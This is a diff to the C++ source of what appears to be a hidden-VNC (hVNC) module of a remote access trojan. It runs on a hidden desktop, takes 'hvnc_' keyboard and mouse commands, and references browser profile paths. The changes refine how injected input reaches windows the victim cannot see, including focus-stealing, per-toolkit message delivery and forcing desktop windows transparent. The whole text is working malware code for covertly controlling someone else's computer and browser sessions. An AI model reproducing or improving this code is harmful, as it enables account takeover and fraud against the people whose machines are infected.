@@ -23,6 +23,7 @@
 #include <condition_variable>
 #include <iostream>
 #include <filesystem>
+#include <chrono>
 #include "../../include/json.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -155,6 +156,13 @@ static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
 static atomic_int g_staticFrameCount(0);
 static atomic_bool g_forceFullFrame(false);
 static atomic<DWORD> g_lastInteractiveFullFrameTick(0);
+
+static bool g_shiftDown = false;
+static bool g_ctrlDown = false;
+static bool g_altDown = false;
+static bool g_capsLock = false;
+static bool g_leftButtonDown = false;
+static HWND g_lbDownHwnd = NULL;
 
 static void request_full_frame(bool immediate = true) {
     DWORD now = GetTickCount();
@@ -901,23 +909,34 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
+static POINT screen_pt(int normX, int normY) {
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    POINT pt;
+    pt.x = (normX * sw) / 65535;
+    pt.y = (normY * sh) / 65535;
+    return pt;
+}
+
+static UINT mouse_message_for_button(int btn, bool down, bool dblClick = false) {
+    if (btn == 1) return down ? WM_RBUTTONDOWN : WM_RBUTTONUP;
+    if (btn == 2) return down ? WM_MBUTTONDOWN : WM_MBUTTONUP;
+    if (dblClick) return WM_LBUTTONDBLCLK;
+    return down ? WM_LBUTTONDOWN : WM_LBUTTONUP;
+}
+
+static WPARAM mouse_wparam_for_button(int btn, bool down) {
+    if (!down) return 0;
+    if (btn == 1) return MK_RBUTTON;
+    if (btn == 2) return MK_MBUTTON;
+    return MK_LBUTTON;
+}
+
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
     if (keyUp) lp |= 0xC0000000;
     return lp;
-}
-
-static bool is_ctrl_key(int vk) {
-    return vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL;
-}
-
-static bool is_shift_key(int vk) {
-    return vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT;
-}
-
-static bool is_alt_key(int vk) {
-    return vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU;
 }
 
 static void set_key_down(BYTE state[256], int vk, bool down) {
@@ -967,51 +986,6 @@ static void send_keyboard_message(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPa
     }
 }
 
-static POINT screen_pt(int normX, int normY) {
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
-    POINT pt;
-    pt.x = (normX * sw) / 65535;
-    pt.y = (normY * sh) / 65535;
-    return pt;
-}
-
-static UINT mouse_message_for_button(int btn, bool down, bool dblClick = false) {
-    if (btn == 1) return down ? WM_RBUTTONDOWN : WM_RBUTTONUP;
-    if (btn == 2) return down ? WM_MBUTTONDOWN : WM_MBUTTONUP;
-    if (dblClick) return WM_LBUTTONDBLCLK;
-    return down ? WM_LBUTTONDOWN : WM_LBUTTONUP;
-}
-
-static WPARAM mouse_wparam_for_button(int btn, bool down) {
-    if (!down) return 0;
-    if (btn == 1) return MK_RBUTTON;
-    if (btn == 2) return MK_MBUTTON;
-    return MK_LBUTTON;
-}
-
-struct EnumHitTest {
-    POINT pt;
-    HWND result;
-};
-
-static BOOL CALLBACK HitTestEnumProc(HWND hwnd, LPARAM lParam) {
-    EnumHitTest* test = (EnumHitTest*)lParam;
-    if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) return TRUE;
-
-    LONG_PTR exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
-    if ((exStyle & WS_EX_TRANSPARENT)) return TRUE;
-
-    RECT rc;
-    if (GetWindowRect(hwnd, &rc)) {
-        if (PtInRect(&rc, test->pt)) {
-            test->result = hwnd;
-            return FALSE; // Found topmost
-        }
-    }
-    return TRUE;
-}
-
 static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
     HWND best = hwnd;
     HWND current = hwnd;
@@ -1032,62 +1006,117 @@ static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
     return best;
 }
 
+static HWND smart_window_from_point(POINT pt) {
+    const int WS_EX_TRANSPARENT_FLAG = 0x00000020;
+
+    for (int attempt = 0; attempt < 4; attempt++) {
+        HWND hwnd = WindowFromPoint(pt);
+        if (!hwnd) return NULL;
+        wchar_t cls[256] = {0};
+        if (GetClassNameW(hwnd, cls, 256)) {
+            if (wcscmp(cls, L"UserOOBEWindowClass") == 0 || wcscmp(cls, L"WorkerW") == 0 || wcscmp(cls, L"Progman") == 0) {
+                LONG_PTR ex = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
+                if ((ex & WS_EX_TRANSPARENT_FLAG) == 0) {
+                    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, ex | WS_EX_TRANSPARENT_FLAG);
+                }
+                continue;
+            }
+        }
+        return hwnd;
+    }
+    return WindowFromPoint(pt);
+}
+
 static HWND target_window_from_screen_point(POINT screenPt) {
-    EnumHitTest test = { screenPt, NULL };
-    EnumWindows(HitTestEnumProc, (LPARAM)&test);
-
-    if (!test.result) test.result = WindowFromPoint(screenPt);
-    if (!test.result || !IsWindow(test.result)) return NULL;
-
-    return resolve_child_window_from_point(test.result, screenPt);
+    HWND hwnd = smart_window_from_point(screenPt);
+    if (!hwnd || !IsWindow(hwnd)) return NULL;
+    return resolve_child_window_from_point(hwnd, screenPt);
 }
 
-static bool is_menu_or_popup(HWND hwnd) {
+static bool is_context_menu_or_popup(HWND prevRoot, HWND root) {
+    if (!root) return false;
+    wchar_t cls[256] = {0};
+    if (GetClassNameW(root, cls, 256)) {
+        if (wcscmp(cls, L"#32768") == 0) return true;
+    }
+    LONG style = GetWindowLongW(root, GWL_STYLE);
+    bool isPopup = (style & WS_POPUP) != 0;
+    if (!isPopup) return false;
+    if (!prevRoot) return false;
+    DWORD pidPrev = 0, pidNew = 0;
+    GetWindowThreadProcessId(prevRoot, &pidPrev);
+    GetWindowThreadProcessId(root, &pidNew);
+    return pidPrev != 0 && pidPrev == pidNew;
+}
+
+static bool is_taskbar(HWND hwnd) {
+    if (!hwnd) return false;
+    HWND r = GetAncestor(hwnd, GA_ROOT);
+    if (!r) r = hwnd;
+    wchar_t cls[256] = {0};
+    GetClassNameW(r, cls, 256);
+    return wcscmp(cls, L"Shell_TrayWnd") == 0;
+}
+
+static void activate_window(HWND root, HWND hwnd) {
+    SetForegroundWindow(root);
+    SetActiveWindow(root);
+    SetFocus(hwnd);
+    g_hLastWindow = hwnd;
+}
+
+static void activate_if_new_window(HWND hwnd) {
+    HWND root = GetAncestor(hwnd, GA_ROOT);
+    if (!root) root = hwnd;
+    HWND prevRoot = g_hLastWindow ? GetAncestor(g_hLastWindow, GA_ROOT) : NULL;
+    if (!prevRoot) prevRoot = g_hLastWindow;
+    g_hLastWindow = hwnd;
+    if (prevRoot == root) return;
+    if (is_context_menu_or_popup(prevRoot, root)) return;
+    if (is_taskbar(root)) return;
+    DWORD pidNew = 0, pidPrev = 0;
+    GetWindowThreadProcessId(root, &pidNew);
+    GetWindowThreadProcessId(prevRoot, &pidPrev);
+    if (pidPrev != 0 && pidPrev == pidNew) return;
+    activate_window(root, hwnd);
+}
+
+static int refine_nc_hit(int hit, HWND root, int x, int y) {
+    if (hit != HTCAPTION && hit != HTCLIENT && hit != 0) return hit;
+    if (hit == HTCLIENT) return HTCLIENT;
+
+    RECT wr;
+    if (!GetWindowRect(root, &wr)) return hit;
+
+    int border = GetSystemMetrics(SM_CXSIZEFRAME);
+    int cy = GetSystemMetrics(SM_CYCAPTION);
+    int btnW = cy * 2;
+    int barTop = wr.top;
+    int barBot = wr.top + cy * 2 + border;
+
+    if (y < barTop || y > barBot) return HTCAPTION;
+    if (x < wr.left || x > wr.right) return HTCAPTION;
+    if (x >= wr.right - btnW) return HTCLOSE;
+    if (x >= wr.right - btnW * 2) return HTMAXBUTTON;
+    if (x >= wr.right - btnW * 3) return HTMINBUTTON;
+
+    return HTCAPTION;
+}
+
+static int safe_nc_hit_test(HWND hwnd, LPARAM lparam) {
+    DWORD_PTR r = 0;
+    SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, lparam, SMTO_ABORTIFHUNG, 30, &r);
+    return (int)r;
+}
+
+static bool should_use_sync_delivery(HWND hwnd) {
     if (!hwnd || !IsWindow(hwnd)) return false;
-    wchar_t cls[256];
+    wchar_t cls[256] = {0};
     if (GetClassNameW(hwnd, cls, 256)) {
-        if (wcscmp(cls, L"#32768") == 0) return true; // Standard Win32 Menu
-        if (wcsstr(cls, L"Chrome_WidgetWin_1")) {
-            // Check if it's a popup/menu by looking for styles
-            LONG style = GetWindowLongW(hwnd, GWL_STYLE);
-            if ((style & WS_POPUP) && !(style & WS_CAPTION)) return true;
-        }
-        if (wcsstr(cls, L"DropDown") || wcsstr(cls, L"Menu") || wcsstr(cls, L"Popup")) return true;
+        if (wcscmp(cls, L"UIItemsView") == 0 || wcscmp(cls, L"DirectUIHWND") == 0) return true;
+        if (wcsncmp(cls, L"Qt5", 3) == 0 || wcsncmp(cls, L"Qt6", 3) == 0 || wcsncmp(cls, L"Qt4", 3) == 0) return true;
     }
-    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
-    return (style & WS_POPUP) && !(style & WS_CAPTION);
-}
-
-static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
-    if (!hwnd || !IsWindow(hwnd)) return;
-    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
-    if (!hRoot) hRoot = hwnd;
-
-    g_hLastWindow = hRoot;
-
-    // Don't switch focus/foreground if clicking a menu or a window that already has its root active
-    if (is_menu_or_popup(hwnd)) return;
-
-    HWND hFore = GetForegroundWindow();
-    if (hFore != hRoot) {
-        DWORD foreThreadId = hFore ? GetWindowThreadProcessId(hFore, NULL) : 0;
-        DWORD targetThreadId = GetWindowThreadProcessId(hRoot, NULL);
-        DWORD currentThreadId = GetCurrentThreadId();
-
-        if (foreThreadId && foreThreadId != targetThreadId) {
-            AttachThreadInput(targetThreadId, foreThreadId, TRUE);
-            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
-            SetForegroundWindow(hRoot);
-            SetFocus(hRoot);
-            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
-            AttachThreadInput(targetThreadId, foreThreadId, FALSE);
-        } else {
-            SetForegroundWindow(hRoot);
-            SetFocus(hRoot);
-        }
-    }
-
-    SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, msg));
+    return false;
 }
 
 // -----------------------------------------------------------------------
@@ -1143,10 +1172,6 @@ static void input_loop() {
     if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
     if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
 
-    bool ctrlDown = false;
-    bool altDown = false;
-    bool shiftDown = false;
-
     while (g_inputRunning) {
         InputTask task;
         {
@@ -1170,32 +1195,61 @@ static void input_loop() {
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
+            HWND hRoot = GetAncestor(hTarget, GA_ROOT);
+            if (!hRoot) hRoot = hTarget;
+            DWORD tid = GetWindowThreadProcessId(hRoot, NULL);
+            if (tid != 0) {
+                GUITHREADINFO gi = { sizeof(GUITHREADINFO) };
+                if (GetGUIThreadInfo(tid, &gi) && gi.hwndFocus != NULL) {
+                    hTarget = gi.hwndFocus;
+                }
+            }
+
+            UINT scan = MapVirtualKeyW((UINT)vk, MAPVK_VK_TO_VSC);
+            LPARAM lpDn = (LPARAM)(1u | (scan << 16));
+            LPARAM lpUp = (LPARAM)(0xC0000001u | (scan << 16));
+
             if (action == "hvnc_keydown") {
-                if (is_ctrl_key(vk)) ctrlDown = true;
-                if (is_alt_key(vk)) altDown = true;
-                if (is_shift_key(vk)) shiftDown = true;
-                send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk,
-                                      key_lparam((WORD)vk, false),
-                                      ctrlDown, altDown, shiftDown);
-                if (vk == VK_RETURN) {
-                    send_keyboard_message(hTarget, WM_CHAR, (WPARAM)13,
-                                          key_lparam((WORD)vk, false),
-                                          ctrlDown, altDown, shiftDown);
-                } else if (vk == VK_BACK) {
-                    send_keyboard_message(hTarget, WM_CHAR, (WPARAM)8,
-                                          key_lparam((WORD)vk, false),
-                                          ctrlDown, altDown, shiftDown);
+                if (vk == 0x10 || vk == 0xA0 || vk == 0xA1) g_shiftDown = true;
+                if (vk == 0x11 || vk == 0xA2 || vk == 0xA3) g_ctrlDown = true;
+                if (vk == 0x12 || vk == 0xA4 || vk == 0xA5) g_altDown = true;
+                if (vk == 0x14) g_capsLock = !g_capsLock;
+
+                bool isModifier = (vk == 0x10 || vk == 0xA0 || vk == 0xA1 ||
+                                   vk == 0x11 || vk == 0xA2 || vk == 0xA3 ||
+                                   vk == 0x12 || vk == 0xA4 || vk == 0xA5 ||
+                                   vk == 0x14);
+
+                if (isModifier) {
+                    send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false),
+                                          g_ctrlDown, g_altDown, g_shiftDown);
+                } else if (g_ctrlDown && !g_altDown && vk >= 0x41 && vk <= 0x5A) {
+                    // Ctrl+Key combinations
+                    send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false),
+                                          g_ctrlDown, g_altDown, g_shiftDown);
+                    send_keyboard_message(hTarget, WM_CHAR, (WPARAM)(vk - 0x40), 1,
+                                          g_ctrlDown, g_altDown, g_shiftDown);
+                } else {
+                    send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false),
+                                          g_ctrlDown, g_altDown, g_shiftDown);
+                    if (vk == VK_RETURN) {
+                        send_keyboard_message(hTarget, WM_CHAR, (WPARAM)13, key_lparam((WORD)vk, false),
+                                              g_ctrlDown, g_altDown, g_shiftDown);
+                    } else if (vk == VK_BACK) {
+                        send_keyboard_message(hTarget, WM_CHAR, (WPARAM)8, key_lparam((WORD)vk, false),
+                                              g_ctrlDown, g_altDown, g_shiftDown);
+                    }
                 }
             } else if (action == "hvnc_keyup") {
-                if (is_ctrl_key(vk)) ctrlDown = false;
-                if (is_alt_key(vk)) altDown = false;
-                if (is_shift_key(vk)) shiftDown = false;
-                send_keyboard_message(hTarget, WM_KEYUP, (WPARAM)vk,
-                                      key_lparam((WORD)vk, true),
-                                      ctrlDown, altDown, shiftDown);
+                if (vk == 0x10 || vk == 0xA0 || vk == 0xA1) g_shiftDown = false;
+                if (vk == 0x11 || vk == 0xA2 || vk == 0xA3) g_ctrlDown = false;
+                if (vk == 0x12 || vk == 0xA4 || vk == 0xA5) g_altDown = false;
+
+                send_keyboard_message(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true),
+                                      g_ctrlDown, g_altDown, g_shiftDown);
             } else if (action == "hvnc_char") {
                 send_keyboard_message(hTarget, WM_CHAR, (WPARAM)vk, 1,
-                                      ctrlDown, altDown, shiftDown);
+                                      g_ctrlDown, g_altDown, g_shiftDown);
             }
             request_full_frame(true);
             continue;
@@ -1213,19 +1267,6 @@ static void input_loop() {
             request_full_frame(false);
             SetCursorPos(screenPt.x, screenPt.y);
             send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);
-
-            HWND hwnd = WindowFromPoint(screenPt);
-            if (hwnd) {
-                POINT clientPt = screenPt;
-                ScreenToClient(hwnd, &clientPt);
-                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
-
-                LRESULT ht = HTCLIENT;
-                if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                        SMTO_ABORTIFHUNG, 50, (PDWORD_PTR)&ht)) {
-                    PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE));
-                }
-            }
 
             if (g_dragging && g_dragHwnd) {
                 int dx = screenPt.x - g_dragStartPt.x;
@@ -1258,13 +1299,18 @@ static void input_loop() {
                                  SWP_NOZORDER | SWP_NOACTIVATE);
                 }
             } else {
-                HWND hwnd = WindowFromPoint(screenPt);
+                HWND hwnd = smart_window_from_point(screenPt);
                 if (hwnd) {
+                    activate_if_new_window(hwnd);
+                    POINT clientPt = screenPt;
+                    ScreenToClient(hwnd, &clientPt);
+                    WPARAM moveWParam = g_leftButtonDown ? MK_LBUTTON : 0;
+                    PostMessageW(hwnd, WM_MOUSEMOVE, moveWParam, MAKELPARAM(clientPt.x, clientPt.y));
+
                     LRESULT ht = HTCLIENT;
                     if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                          SMTO_ABORTIFHUNG, 50, (PDWORD_PTR)&ht)) {
-                        SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE),
-                                          SMTO_ABORTIFHUNG, 50, NULL);
+                                            SMTO_ABORTIFHUNG, 50, (PDWORD_PTR)&ht)) {
+                        PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE));
                     }
                 }
             }
@@ -1276,42 +1322,48 @@ static void input_loop() {
             int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
 
+            if (btn == 0) g_leftButtonDown = true;
+
             HWND hwnd = target_window_from_screen_point(screenPt);
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
-                LRESULT ht = HTCLIENT;
-                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                if (!hRoot) hRoot = hwnd;
 
-                if (ht != HTCLIENT && btn == 0) {
-                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
-                    if (hRoot) {
-                        if (ht == HTCLOSE) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0); continue; }
-                        else if (ht == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
-                        else if (ht == HTMAXBUTTON) {
-                            WINDOWPLACEMENT wp = { sizeof(wp) };
-                            GetWindowPlacement(hRoot, &wp);
-                            if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
-                            else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
-                            continue;
-                        }
+                // NC Hit-test refinement
+                int hit = safe_nc_hit_test(hwnd, MAKELPARAM(screenPt.x, screenPt.y));
+                hit = refine_nc_hit(hit, hRoot, screenPt.x, screenPt.y);
 
-                        if (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT || ht == HTTOP || ht == HTBOTTOM ||
-                            ht == HTTOPLEFT || ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT) {
-                            g_dragging = true;
-                            g_dragHwnd = hRoot;
-                            g_dragStartPt = screenPt;
-                            g_dragHitTest = ht;
-                            GetWindowRect(hRoot, &g_dragStartRect);
-                            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
-                            continue;
-                        }
+                if (hit != HTCLIENT && btn == 0) {
+                    if (hit == HTCLOSE) { PostMessageW(hRoot, WM_CLOSE, 0, 0); continue; }
+                    else if (hit == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
+                    else if (hit == HTMAXBUTTON) {
+                        WINDOWPLACEMENT wp = { sizeof(wp) };
+                        GetWindowPlacement(hRoot, &wp);
+                        if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
+                        else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
+                        continue;
+                    }
+
+                    if (hit == HTCAPTION || hit == HTLEFT || hit == HTRIGHT || hit == HTTOP || hit == HTBOTTOM ||
+                        hit == HTTOPLEFT || hit == HTTOPRIGHT || hit == HTBOTTOMLEFT || hit == HTBOTTOMRIGHT) {
+                        g_dragging = true;
+                        g_dragHwnd = hRoot;
+                        g_dragStartPt = screenPt;
+                        g_dragHitTest = hit;
+                        GetWindowRect(hRoot, &g_dragStartRect);
+                        send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                        continue;
                     }
                 }
 
-                UINT mouseMsg = mouse_message_for_button(btn, true);
-                activate_target_window(hwnd, mouseMsg, ht);
+                // Activate if new window and not a popup/menu
+                HWND prevRoot = g_hLastWindow ? GetAncestor(g_hLastWindow, GA_ROOT) : NULL;
+                if (!prevRoot) prevRoot = g_hLastWindow;
+                if (!is_context_menu_or_popup(prevRoot, hRoot)) {
+                    activate_window(hRoot, hwnd);
+                }
                 g_hCurrentFocus = hwnd;
                 g_mouseDownTarget[btn] = hwnd;
 
@@ -1320,9 +1372,37 @@ static void input_loop() {
                 LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
 
                 SetCursorPos(screenPt.x, screenPt.y);
-                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
-                PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
+
+                bool useSync = should_use_sync_delivery(hwnd);
+                UINT mouseMsg = mouse_message_for_button(btn, true);
+
+                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hit, mouseMsg));
+
+                if (btn == 0) {
+                    if (useSync) {
+                        wchar_t cls[256] = {0};
+                        GetClassNameW(hwnd, cls, 256);
+                        bool isQt = (wcsncmp(cls, L"Qt5", 3) == 0 || wcsncmp(cls, L"Qt6", 3) == 0 || wcsncmp(cls, L"Qt4", 3) == 0);
+                        if (isQt) {
+                            DWORD_PTR rDummy = 0;
+                            SendMessageTimeoutW(hwnd, WM_MOUSEMOVE, 0, lParam, SMTO_ABORTIFHUNG, 50, &rDummy);
+                        }
+                        DWORD_PTR rDummy = 0;
+                        SendMessageTimeoutW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                        g_lbDownHwnd = hwnd;
+                    } else {
+                        PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
+                        PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
+                        g_lbDownHwnd = hwnd;
+                    }
+                } else {
+                    if (useSync) {
+                        DWORD_PTR rDummy = 0;
+                        SendMessageTimeoutW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                    } else {
+                        PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
+                    }
+                }
             }
             continue;
         }
@@ -1331,6 +1411,8 @@ static void input_loop() {
             request_full_frame(true);
             int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
+
+            if (btn == 0) g_leftButtonDown = false;
 
             if (btn == 0 && g_dragging) {
                 g_dragging = false;
@@ -1344,18 +1426,50 @@ static void input_loop() {
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
-                LRESULT ht = HTCLIENT;
-                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                if (!hRoot) hRoot = hwnd;
+
+                int hit = safe_nc_hit_test(hwnd, MAKELPARAM(screenPt.x, screenPt.y));
+                hit = refine_nc_hit(hit, hRoot, screenPt.x, screenPt.y);
 
                 UINT mouseMsg = mouse_message_for_button(btn, false);
-                POINT clientPt = screenPt;
-                ScreenToClient(hwnd, &clientPt);
 
-                SetCursorPos(screenPt.x, screenPt.y);
-                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
-                PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), MAKELPARAM(clientPt.x, clientPt.y));
+                if (btn == 0) {
+                    HWND upTarget = (g_lbDownHwnd != NULL && IsWindow(g_lbDownHwnd)) ? g_lbDownHwnd : hwnd;
+                    g_lbDownHwnd = NULL;
+
+                    POINT clientPt = screenPt;
+                    ScreenToClient(upTarget, &clientPt);
+                    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
+
+                    SetCursorPos(screenPt.x, screenPt.y);
+                    PostMessageW(upTarget, WM_SETCURSOR, (WPARAM)upTarget, MAKELPARAM(hit, mouseMsg));
+
+                    bool useSync = should_use_sync_delivery(upTarget);
+                    if (useSync) {
+                        DWORD_PTR rDummy = 0;
+                        SendMessageTimeoutW(upTarget, WM_MOUSEMOVE, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 50, &rDummy);
+                        SendMessageTimeoutW(upTarget, WM_LBUTTONUP, 0, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                    } else {
+                        PostMessageW(upTarget, WM_MOUSEMOVE, MK_LBUTTON, lParam);
+                        PostMessageW(upTarget, WM_LBUTTONUP, 0, lParam);
+                    }
+                } else {
+                    POINT clientPt = screenPt;
+                    ScreenToClient(hwnd, &clientPt);
+                    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
+
+                    SetCursorPos(screenPt.x, screenPt.y);
+                    PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hit, mouseMsg));
+
+                    bool useSync = should_use_sync_delivery(hwnd);
+                    if (useSync) {
+                        DWORD_PTR rDummy = 0;
+                        SendMessageTimeoutW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                    } else {
+                        PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), lParam);
+                    }
+                }
             }
             g_mouseDownTarget[btn] = NULL;
             continue;
@@ -1370,15 +1484,22 @@ static void input_loop() {
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
-                LRESULT ht = HTCLIENT;
-                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                if (!hRoot) hRoot = hwnd;
+
+                int hit = safe_nc_hit_test(hwnd, MAKELPARAM(screenPt.x, screenPt.y));
+                hit = refine_nc_hit(hit, hRoot, screenPt.x, screenPt.y);
 
                 UINT downMsg = mouse_message_for_button(btn, true);
                 UINT upMsg   = mouse_message_for_button(btn, false);
                 UINT dblMsg  = mouse_message_for_button(btn, true, btn == 0);
 
-                activate_target_window(hwnd, downMsg, ht);
+                // Activate window
+                HWND prevRoot = g_hLastWindow ? GetAncestor(g_hLastWindow, GA_ROOT) : NULL;
+                if (!prevRoot) prevRoot = g_hLastWindow;
+                if (!is_context_menu_or_popup(prevRoot, hRoot)) {
+                    activate_window(hRoot, hwnd);
+                }
 
                 POINT clientPt = screenPt;
                 ScreenToClient(hwnd, &clientPt);
@@ -1387,12 +1508,23 @@ static void input_loop() {
                 WPARAM upWParam   = mouse_wparam_for_button(btn, false);
 
                 SetCursorPos(screenPt.x, screenPt.y);
-                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, downMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, downWParam, lParam);
-                PostMessageW(hwnd, downMsg, downWParam, lParam);
-                PostMessageW(hwnd, upMsg, upWParam, lParam);
-                PostMessageW(hwnd, dblMsg, downWParam, lParam);
-                PostMessageW(hwnd, upMsg, upWParam, lParam);
+                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hit, downMsg));
+
+                bool useSync = should_use_sync_delivery(hwnd);
+                if (useSync) {
+                    DWORD_PTR rDummy = 0;
+                    SendMessageTimeoutW(hwnd, WM_MOUSEMOVE, downWParam, lParam, SMTO_ABORTIFHUNG, 50, &rDummy);
+                    SendMessageTimeoutW(hwnd, downMsg, downWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                    SendMessageTimeoutW(hwnd, upMsg, upWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                    SendMessageTimeoutW(hwnd, dblMsg, downWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                    SendMessageTimeoutW(hwnd, upMsg, upWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
+                } else {
+                    PostMessageW(hwnd, WM_MOUSEMOVE, downWParam, lParam);
+                    PostMessageW(hwnd, downMsg, downWParam, lParam);
+                    PostMessageW(hwnd, upMsg, upWParam, lParam);
+                    PostMessageW(hwnd, dblMsg, downWParam, lParam);
+                    PostMessageW(hwnd, upMsg, upWParam, lParam);
+                }
             }
             continue;
         }
@@ -1476,36 +1608,96 @@ static wstring get_gecko_profile_path(const wstring& browserName) {
     return path;
 }
 
